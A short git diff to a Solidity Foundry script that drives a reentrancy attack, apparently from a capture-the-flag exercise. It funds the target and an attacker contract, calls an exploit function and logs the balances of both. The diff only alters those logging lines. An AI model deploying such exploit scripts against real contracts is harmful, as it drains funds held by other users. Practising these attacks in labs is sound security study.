@@ -16,11 +16,13 @@ contract AttackerReentranceScript is Script {
         reentrance.donate{value: 0.005 ether}(address(this));
         reentrance.donate{value: 0.001 ether}(address(attackerReentrance));
 
-        console.log("Current attacker balance :", address(attackerReentrance).balance);
+        console.log("Current reentrance :", address(reentrance).balance);
+        console.log("Current attacker :", address(attackerReentrance).balance);
 
         attackerReentrance.exploit(address(reentrance));
 
-        console.log("New attacker balance :", address(attackerReentrance).balance);
+        console.log("new reentrance :", address(reentrance).balance);
+        console.log("New attacker :", address(attackerReentrance).balance);
 
         vm.stopBroadcast();
     }
